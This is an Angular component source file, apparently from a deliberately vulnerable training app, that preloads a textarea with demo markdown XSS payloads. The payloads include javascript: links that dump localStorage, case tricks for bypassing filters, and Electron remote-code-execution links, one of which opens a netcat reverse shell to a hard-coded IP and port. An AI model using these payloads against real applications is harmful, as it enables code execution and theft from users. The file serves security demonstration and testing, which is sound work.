// Angular imports
import {
  ChangeDetectionStrategy,
  Component,
  ChangeDetectorRef,
  AfterViewInit
} from '@angular/core';
import { FormGroup, FormControl } from '@angular/forms';

@Component({
  selector: 'vulnerable-markdown',
  templateUrl: './markdown.component.html',
  styleUrls: ['./markdown.component.scss'],
  changeDetection: ChangeDetectionStrategy.OnPush
})
export class MarkdownComponent implements AfterViewInit {
  // Demo markdown XXS payloads
  // tslint:disable: no-trailing-whitespace
  demoPayloads = `### Demo Markdown XSS Payloads
  
[Basic XSS](javascript:alert('Basic'))

[What's in LocalStorage?](javascript:alert(JSON.stringify(localStorage)))  

[Case may bypass bad XSS filters](JaVaScRiPt:alert('CaseInsensitive'))  

[URL](javascript://www.google.com%0Aalert('URL'))


### Electron Remote Code Execution Demo

[RCE - dir](javascript:require('child_process').exec('dir',function(e,r){alert(r)}))

[RCE - Reverse TCP Shell](javascript:require('child_process').exec('nc.exe%20192.168.0.175%2011235%20-e%20cmd.exe'))

#### Notes

* Spaces break things, encoding is your friend
* Play around, different implementations produce different results
* For a shell, you'll need to update IP and port, plus have nc installed on your target

`;

  // Form controlling the markdown state
  markdownForm = new FormGroup({
    markdownTextarea: new FormControl(this.demoPayloads)
  });

  constructor(private _ref: ChangeDetectorRef) {}

  ngAfterViewInit(): void {
    this.markdownForm.controls.markdownTextarea.setValue(this.demoPayloads);
    this._ref.detectChanges();
  }
}

